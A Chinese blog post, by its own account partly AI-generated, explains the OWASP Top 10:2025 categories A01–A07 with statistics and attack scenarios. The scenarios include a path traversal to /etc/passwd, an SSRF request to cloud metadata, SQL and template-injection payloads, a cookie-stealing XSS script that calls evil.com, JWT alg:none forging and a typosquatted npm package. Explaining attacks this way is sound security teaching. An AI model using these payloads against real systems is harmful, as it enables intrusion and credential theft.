[ **Infernity's blog** ](https://infernity.top/)
  * [ 首页 ](https://infernity.top/)
  * [ 归档 ](https://infernity.top/archives/)
  * [ 分类 ](https://infernity.top/categories/)
  * [ 标签 ](https://infernity.top/tags/)
  * [ 关于 ](https://infernity.top/about/)
  * [ friends ](https://infernity.top/friends/)
  * [ ](javascript:;)
  * [ ](javascript:;)


OWASP TOP 10 2025 详细解析
2026年7月8日 上午 
5.7k 字  48 分钟 
# OWASP TOP 10 2025 详细解析
> 注意：本文内容部分由AI生成，请读者注意甄别。
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E5%89%8D%E8%A8%80)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E5%89%8D%E8%A8%80 "前言")前言
OWASP（Open Web Application Security Project，开放式 Web 应用程序安全项目）是一个非营利组织，致力于提升软件安全性。其旗舰项目 OWASP Top 10 是 Web 应用安全领域最权威的风险评估标准，自 2003 年首次发布以来，已成为全球安全从业人员、开发者和审计人员的必备参考。
OWASP 官方当前已发布 **OWASP Top 10:2025** 版本，这是继 2021 版之后的大版本更新。本轮收录了来自 **超过 280 万个应用程序** 的测试数据，数据集中分析了 **589 个 CWE** （2021 年约 400 个），最终 10 个类别共覆盖 **248 个 CWE** ，是迄今为止数据规模最大的一版。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2021-%E7%89%88-vs-2025-%E7%89%88%E5%8F%98%E5%8C%96%E4%B8%80%E8%A7%88)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2021-%E7%89%88-vs-2025-%E7%89%88%E5%8F%98%E5%8C%96%E4%B8%80%E8%A7%88 "2021 版 vs 2025 版变化一览")2021 版 vs 2025 版变化一览
[![2025-mappings](https://infernity.top/img/OWASP-TOP-10-2025/2025-mappings.png)](https://infernity.top/img/OWASP-TOP-10-2025/2025-mappings.png "2025-mappings")2025-mappings
一眼看过去，最大的变化有三处：
  1. **A02 安全配置错误** 从 #5 跃升至 #2，成为上升幅度最大的类别
  2. **A03 软件供应链安全** 正式独立成类，从 2021 版的 #6 “脆弱和过时的组件” 扩展为涵盖整个软件供应链
  3. **A10 异常条件处理不当** 作为全新类别入榜


而原先 2021 版的 **A10:2021 SSRF** 类别被整合到了 A01 访问控制中，不再单独列出。  
| 排名  | 2025 类别  | 2021 排名  | 变化趋势  |  
| --- | --- | --- | --- |  
| **A01**  | 访问控制失效 (Broken Access Control)  | #1  | ↔ 持平（SSRF 并入此类别）  |  
| **A02**  | 安全配置错误 (Security Misconfiguration)  | #5  |  **↑3** 最大上升  |  
| **A03**  | 软件供应链失效 (Software Supply Chain Failures)  | #6 (原”脆弱和过时的组件”)  |  **↑3** 大幅扩展  |  
| **A04**  | 加密机制失效 (Cryptographic Failures)  | #2  | ↓2  |  
| **A05**  | 注入 (Injection)  | #3  | ↓2  |  
| **A06**  | 不安全设计 (Insecure Design)  | #4  | ↓2  |  
| **A07**  | 身份认证失效 (Authentication Failures)  | #7  | ↔ 持平（名称缩短）  |  
| **A08**  | 软件或数据完整性失效 (Software or Data Integrity Failures)  | #8  | ↔ 持平（名称微调）  |  
| **A09**  | 安全日志和告警失效 (Security Logging & Alerting Failures)  | #9  | ↔ 持平（名称变更）  |  
| **A10**  | 异常条件处理不当 (Mishandling of Exceptional Conditions)  | 🆕  | **新上榜**  |  
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%96%B9%E6%B3%95%E8%AE%BA%E7%AE%80%E8%BF%B0)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%96%B9%E6%B3%95%E8%AE%BA%E7%AE%80%E8%BF%B0 "方法论简述")方法论简述
OWASP Top 10 2025 延续了”数据驱动但不盲从数据”的选型哲学：
  * **数据来源** ：OWASP 2025 版要求贡献方提交自 **2021 年起** 的应用测试数据；最终数据覆盖超过 280 万个应用程序，数据贡献方包括多家安全厂商与组织。
  * **排名策略** ：OWASP 基于贡献数据对 12 个候选类别进行排序，并允许 2 个类别由社区调查结果提升/突出；最终 Top 10 中有 8 个类别主要来自数据，2 个类别（A03 和 A09）由社区调查提升/突出。
  * **CVSS 权重** ：结合 CVSS v2 和 v3 的 Exploit 和 Impact 评分对 CWE 进行加权。
  * **根本原因优先** ：继续向”根本原因”分类倾斜，而非”症状”分类。例如，”敏感数据暴露”这个症状被拆解到加密、配置、访问控制等根本原因类别中。


> 为什么不全用数据？因为自动化工具能测到的东西永远落后于实战。实战中 AppSec 专家发现的新型攻击模式，往往要过几年才能被工具集成，而社区调查就是为了弥补这个盲区。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A01-2025-%E2%80%94-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%A4%B1%E6%95%88-Broken-Access-Control)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A01-2025-%E2%80%94-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%A4%B1%E6%95%88-Broken-Access-Control "A01:2025 — 访问控制失效 \(Broken Access Control\)")A01:2025 — 访问控制失效 (Broken Access Control)
[![A01 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Broken_Access_Control.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Broken_Access_Control.png "A01 icon")A01 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE "背景与数据")背景与数据
连续第二届蝉联榜首。**100% 的受测应用存在某种形式的访问控制问题** ，平均发生率为 **3.74%**。此类别映射了 40 个 CWE，总发生次数超过 **183 万次** ，关联 CVE 达到 **32,654 个** 。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 40 个（触达上限）  |  
| 最大发生率  | 20.15%  |  
| 平均发生率  | 3.74%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 42.93%  |  
| 平均加权 Exploit 评分  | 7.04  |  
| 平均加权 Impact 评分  | 3.84  |  
| 总发生次数  | 1,839,701  |  
| 关联 CVE  | 32,654  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88 "主要包含什么")主要包含什么
访问控制是指确保用户只能在其预定权限范围内操作的安全机制。失效典型表现为：
  * **越权访问** ：用户可访问他人的账户数据（CWE-639 水平越权 / CWE-862 功能级越权）
  * **路径遍历** （CWE-22）：通过 `../../../etc/passwd` 读取任意文件
  * **SSRF** （CWE-918）：诱导服务端向内部网络发起请求（**2025 版新纳入此类别** ）
  * **CSRF** （CWE-352）：跨站请求伪造
  * **Open Redirect** （CWE-601）：开放重定向
  * **信息暴露** （CWE-200）：敏感信息泄露给未授权主体
  * **直接请求/强制浏览** （CWE-425）：绕过前端控制直接访问后端接口


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF "攻击场景")攻击场景
**场景 1：水平越权**  
| 
```
1  
2  

```
 | 
```
GET /app/accountInfo?acct=notmyacct HTTP/1.1  
Host: example.com  

__HTTP
```
 |  
| --- | --- |  
攻击者修改浏览器中的 `acct` 参数，无需任何验证即可访问任意用户的账户信息。
**场景 2：垂直越权**  
| 
```
1  
2  

```
 | 
```
# 非管理员用户直接访问管理接口  
curl https://example.com/app/admin_getappInfo  

__BASH
```
 |  
| --- | --- |  
应用仅在前端 JavaScript 中做了权限控制，但后端未验证。攻击者直接从命令行访问即可绕过。
**场景 3：SSRF 打内网**  
| 
```
1  
2  
3  
4  
5  

```
 | 
```
POST /api/fetch HTTP/1.1  
Host: example.com  
Content-Type: application/json  
  
{"url": "http://169.254.169.254/latest/meta-data/"}  

__HTTP
```
 |  
| --- | --- |  
应用未对用户传入的 URL 做白名单限制，攻击者可请求云实例元数据接口窃取临时凭证。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A02-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-Security-Misconfiguration)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A02-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-Security-Misconfiguration "A02:2025 — 安全配置错误 \(Security Misconfiguration\)")A02:2025 — 安全配置错误 (Security Misconfiguration)
[![A02 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Security_Misconfiguration.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Security_Misconfiguration.png "A02 icon")A02 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-1)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-1 "背景与数据")背景与数据
从上一届的 #5 飙升至 #2，是上升幅度最大的类别。**100% 的受测应用存在某种形式的配置错误** ，平均发生率为 **3.00%**，总发生次数超过 **71.9 万次** 。随着软件可配置化程度越来越高，这个类别只会更严重。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 16 个  |  
| 最大发生率  | 27.70%  |  
| 平均发生率  | 3.00%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 52.35%  |  
| 平均加权 Exploit 评分  | 7.96  |  
| 平均加权 Impact 评分  | 3.97  |  
| 总发生次数  | 719,084  |  
| 关联 CVE  | 1,375  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-1)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-1 "主要包含什么")主要包含什么
  * **默认账户和密码** ：admin/admin、root/toor 等未修改的默认凭据
  * **开放的云存储** ：S3 bucket 或 Azure Blob 未设权限就开放公网访问
  * **冗余功能** ：生产环境启用了调试模式、Swagger UI 等不该暴露的接口
  * **安全头缺失** ：缺少 CSP、X-Frame-Options、HSTS 等安全头
  * **详细错误信息** ：堆栈跟踪、数据库版本、内部架构信息直接返回给用户
  * **XXE** （CWE-611）：XML 外部实体注入也归入了此类别


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-1)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-1 "攻击场景")攻击场景
**场景 1：默认凭据**
应用服务器自带的管理控制台未移除，且默认账号密码未修改。攻击者直接用 `admin/admin` 登录并接管服务器。
**场景 2：目录列表暴露**
服务器未禁用目录列表功能，攻击者列出目录后下载编译的 Java 类文件，反编译后发现了严重的访问控制漏洞。
**场景 3：详细错误信息泄露**  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  
9  
10  

```
 | 
```
HTTP/1.1 500 Internal Server Error  
  
{  
  "error": "SQLException",  
  "message": "Table 'users' not found in database 'prod_db'",  
  "stacktrace": "at com.example.dao.UserDAO.findUser(UserDAO.java:42)  
                 at com.example.controller.LoginController.login(LoginController.java:28)  
                 ...",  
  "db_version": "MySQL 8.0.35"  
}  

__JSON
```
 |  
| --- | --- |  
堆栈跟踪直接暴露了数据库名称、版本和代码路径结构。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A03-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%A4%B1%E6%95%88-Software-Supply-Chain-Failures)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A03-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%A4%B1%E6%95%88-Software-Supply-Chain-Failures "A03:2025 — 软件供应链失效 \(Software Supply Chain Failures\)")A03:2025 — 软件供应链失效 (Software Supply Chain Failures)
[![A03 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Supply_Chain_Failures.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Supply_Chain_Failures.png "A03 icon")A03 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-2)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-2 "背景与数据")背景与数据
2025 版最受瞩目的新类别。虽然仅映射了 **6 个 CWE** ，但平均发生率为 **5.72%**，是本轮官方 Score table 中平均发生率最高的类别。在社区调查中，** 正好 50% 的受访者将其列为 #1** 关注重点。
> 这个类别从 2021 版的 A06 “Vulnerable and Outdated Components” 大幅扩展而来，现在的范围涵盖了整个软件供应链。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 6 个  |  
| 最大发生率  | 9.56%  |  
| 平均发生率  | 5.72%  |  
| 最大覆盖率  | 65.42%  |  
| 平均覆盖率  | 27.47%  |  
| 平均加权 Exploit 评分  | 8.17  |  
| 平均加权 Impact 评分  | 5.23  |  
| 总发生次数  | 215,248  |  
| 关联 CVE  | 11  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-2)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-2 "主要包含什么")主要包含什么
  * **第三方依赖漏洞** ：使用了存在已知漏洞的组件版本
  * **恶意软件包** ：依赖于被投毒的开源包（typo-squatting、包仓库攻击）
  * **构建系统被入侵** ：CI/CD 流水线被篡改，镜像被替换
  * **分发基础设施被攻破** ：如 SolarWinds 事件中的更新服务器被控制


> SolarWinds、Log4Shell (Log4j)、MoveIT —— 这些灾难性事件的共同点：一旦供应链被污染，攻击的爆炸半径极为可怕。
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-2)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-2 "攻击场景")攻击场景
**场景 1：Log4Shell 式依赖漏洞**  
| 
```
1  
2  
3  
4  
5  
6  

```
 | 
```
<!-- pom.xml 中引用了存在漏洞的 log4j 版本 -->  
<dependency>  
    <groupId>org.apache.logging.log4j</groupId>  
    <artifactId>log4j-core</artifactId>  
    <version>2.14.1</version>  <!-- CVE-2021-44228 -->  
</dependency>  

__XML
```
 |  
| --- | --- |  
**场景 2：恶意 npm 包**  
| 
```
1  
2  

```
 | 
```
# 攻击者发布了一个名称类似于流行包的恶意 npm 包  
npm install lod-ash  # 注意：这不是 lodash！  

__BASH
```
 |  
| --- | --- |  
恶意包在 `postinstall` 脚本中收集环境变量和环境信息并外发到攻击者服务器。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A04-2025-%E2%80%94-%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6%E5%A4%B1%E6%95%88-Cryptographic-Failures)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A04-2025-%E2%80%94-%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6%E5%A4%B1%E6%95%88-Cryptographic-Failures "A04:2025 — 加密机制失效 \(Cryptographic Failures\)")A04:2025 — 加密机制失效 (Cryptographic Failures)
[![A04 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Cryptographic_Failures.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Cryptographic_Failures.png "A04 icon")A04 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-3)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-3 "背景与数据")背景与数据
从 #2 下降至 #4，一定程度上反映了行业在加密基线方面的进步（如 TLS 1.2+、HSTS 的广泛采用）。此类别映射了 **32 个 CWE** ，官方统计关联 **2,185 个 CVE** 。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 32 个  |  
| 最大发生率  | 13.77%  |  
| 平均发生率  | 3.80%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 47.74%  |  
| 平均加权 Exploit 评分  | 7.23  |  
| 平均加权 Impact 评分  | 3.90  |  
| 总发生次数  | 1,665,348  |  
| 关联 CVE  | 2,185  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-3)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-3 "主要包含什么")主要包含什么
  * **明文传输** ：敏感数据使用 HTTP 而非 HTTPS 传输
  * **弱加密算法** ：MD5、SHA1、RC4 等已被证明不安全的算法
  * **密钥管理不当** ：硬编码密钥、密钥泄露到代码仓库
  * **敏感数据明文存储** ：密码、信用卡号以明文存入数据库
  * **弱 TLS 配置** ：接受过时协议版本和弱密码套件


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-3)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-3 "攻击场景")攻击场景
**场景 1：密码明文存储**  
| 
```
1  
2  
3  
4  
5  

```
 | 
```
-- 数据库中直接存了明文密码  
SELECT username, password FROM users;  
-- username  | password  
-- admin     | P@ssw0rd123!  
-- user1     | qwerty123  

__SQL
```
 |  
| --- | --- |  
一旦数据库泄露（如 SQL 注入），所有用户的密码直接暴露。
**场景 2：硬编码密钥**  
| 
```
1  
2  
3  
4  

```
 | 
```
# config.py - 直接上传到了 GitHub  
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"  
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  
ENCRYPTION_KEY = "my-super-secret-key-1234"  

__PYTHON
```
 |  
| --- | --- |  
代码仓库扫描工具发现后，攻击者可直接接管云资源。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A05-2025-%E2%80%94-%E6%B3%A8%E5%85%A5-Injection)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A05-2025-%E2%80%94-%E6%B3%A8%E5%85%A5-Injection "A05:2025 — 注入 \(Injection\)")A05:2025 — 注入 (Injection)
[![A05 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Injection.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Injection.png "A05 icon")A05 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-4)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-4 "背景与数据")背景与数据
从 #3 下降至 #5，但不是因为注入漏洞变少了，而是因为现代框架（如 ORM、参数化查询默认开启）大幅减少了基本 SQL 注入的发生率。不过此类别映射了 **37 个 CWE** ，依然是 CVE 关联最多的类别。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 37 个  |  
| 最大发生率  | 13.77%  |  
| 平均发生率  | 3.08%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 42.93%  |  
| 平均加权 Exploit 评分  | 7.15  |  
| 平均加权 Impact 评分  | 4.32  |  
| 总发生次数  | 1,404,249  |  
| 关联 CVE  | 62,445  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-4)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-4 "主要包含什么")主要包含什么
  * **SQL 注入** （CWE-89）：通过拼接用户输入构造恶意 SQL
  * **NoSQL 注入** ：MongoDB、Redis 等非关系型数据库的注入
  * **命令注入** （CWE-77/78）：用户输入被拼接到系统命令中执行
  * **XSS 跨站脚本** （CWE-79）：反射型、存储型、DOM 型
  * **模板注入** （SSTI）：服务端模板引擎执行用户输入的表达式


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-4)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-4 "攻击场景")攻击场景
**场景 1：经典 SQL 注入**  
| 
```
1  
2  

```
 | 
```
GET /products?category=Gifts'+OR+1=1-- HTTP/1.1  
Host: example.com  

__HTTP
```
 |  
| --- | --- |  
| 
```
1  
2  
3  
4  

```
 | 
```
// 危险的字符串拼接  
String query = "SELECT * FROM products WHERE category = '" + request.getParameter("category") + "'";  
Statement stmt = connection.createStatement();  
ResultSet rs = stmt.executeQuery(query);  

__JAVA
```
 |  
| --- | --- |  
**场景 2：SSTI（服务端模板注入）**  
| 
```
1  
2  
3  
4  
5  
6  

```
 | 
```
# Flask 应用中  
@app.route('/hello')  
def hello():  
    name = request.args.get('name', 'World')  
    template = f"<h1>Hello {name}!</h1>"  
    return render_template_string(template)  

__PYTHON
```
 |  
| --- | --- |  
| 
```
1  

```
 | 
```
GET /hello?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1  

__HTTP
```
 |  
| --- | --- |  
**场景 3：XSS 存储型**  
| 
```
1  
2  
3  
4  

```
 | 
```
<!-- 评论框中输入后被直接渲染到页面 -->  
<script>  
fetch('https://evil.com/steal?cookie=' + document.cookie);  
</script>  

__HTML
```
 |  
| --- | --- |  
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A06-2025-%E2%80%94-%E4%B8%8D%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1-Insecure-Design)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A06-2025-%E2%80%94-%E4%B8%8D%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1-Insecure-Design "A06:2025 — 不安全设计 \(Insecure Design\)")A06:2025 — 不安全设计 (Insecure Design)
[![A06 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Insecure_Design.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Insecure_Design.png "A06 icon")A06 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-5)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-5 "背景与数据")背景与数据
从 #4 下降至 #6，映射了 **39 个 CWE** 。这是一个 **无法通过自动化测试直接发现的类别** ——它涉及的是软件架构层面和设计层面的安全缺陷。
> **核心理念** ：一个安全的设计仍然可能存在实现上的缺陷。但一个不安全的设计，即使实现得再完美，也无法被修复。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 39 个  |  
| 最大发生率  | 22.18%  |  
| 平均发生率  | 1.86%  |  
| 最大覆盖率  | 88.76%  |  
| 平均覆盖率  | 35.18%  |  
| 平均加权 Exploit 评分  | 6.96  |  
| 平均加权 Impact 评分  | 4.05  |  
| 总发生次数  | 729,882  |  
| 关联 CVE  | 7,647  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-5)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-5 "主要包含什么")主要包含什么
  * **缺乏威胁建模** ：在设计和架构阶段没有识别潜在威胁
  * **安全需求缺失** ：功能需求中未纳入安全要求
  * **默认不安全** ：系统默认配置开放所有功能，用户需要手动关闭
  * **缺少速率限制** ：登录、API 调用未限制频率，放任暴力破解和 DDoS


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-5)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-5 "攻击场景")攻击场景
**场景 1：密码重置的”先改密码再验证”设计缺陷**  
| 
```
1  

```
 | 
```
1. 用户输入邮箱 → 2. 发送重置链接 → 3. 用户点击链接 → 4. 输入新密码  

__APACHE
```
 |  
| --- | --- |  
如果第 4 步不需要有效的重置 Token，攻击者可以直接调用 API 修改任何人密码。
**场景 2：缺少速率限制**  
| 
```
1  
2  
3  
4  
5  
6  
7  

```
 | 
```
POST /api/login HTTP/1.1  
  
{"username": "admin", "password": "123456"}  
{"username": "admin", "password": "password"}  
{"username": "admin", "password": "12345678"}  
...  
# 无次数限制，可以暴力尝试 100 万个密码  

__HTTP
```
 |  
| --- | --- |  
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A07-2025-%E2%80%94-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88-Authentication-Failures)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A07-2025-%E2%80%94-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88-Authentication-Failures "A07:2025 — 身份认证失效 \(Authentication Failures\)")A07:2025 — 身份认证失效 (Authentication Failures)
[![A07 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Authentication_Failures.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Authentication_Failures.png "A07 icon")A07 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-6)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-6 "背景与数据")背景与数据
排名稳定在 #7。名称从 2021 版的 “Identification and Authentication Failures” 简化为 “Authentication Failures”。映射了 **36 个 CWE** 。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 36 个  |  
| 最大发生率  | 15.80%  |  
| 平均发生率  | 2.92%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 37.14%  |  
| 平均加权 Exploit 评分  | 7.69  |  
| 平均加权 Impact 评分  | 4.44  |  
| 总发生次数  | 1,120,673  |  
| 关联 CVE  | 7,147  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-6)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-6 "主要包含什么")主要包含什么
  * **弱密码策略** ：允许 “123456”、”password” 等常见弱密码
  * **凭据填充（Credential Stuffing）** ：利用已泄露的用户名密码组合批量尝试
  * **缺少 MFA** ：没有多因素认证
  * **会话管理缺陷** ：Token 过期时间过长、未在服务端失效
  * **不安全的 JWT 处理** ：使用 `alg: none` 或弱签名密钥
  * **账户枚举** ：登录失败时返回不同错误信息，可枚举有效用户名


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-6)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-6 "攻击场景")攻击场景
**场景 1：JWT`alg: none` 攻击**  
| 
```
1  
2  
3  
4  
5  

```
 | 
```
import jwt  
  
# 攻击者将算法改为 "none"，绕过签名验证  
token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")  
# 如果服务端未正确限制算法白名单，此 token 将被接受  

__PYTHON
```
 |  
| --- | --- |  
**场景 2：账户枚举**  
| 
```
1  
2  
3  
4  
5  
6  

```
 | 
```
POST /api/login HTTP/1.1  
  
{"username": "admin", "password": "wrong"}  
  
# 响应： "Password incorrect for user admin"  
# 攻击者可以确认 admin 用户存在  

__HTTP
```
 |  
| --- | --- |  
正确做法应该是返回通用的 “用户名或密码错误”。
* * *
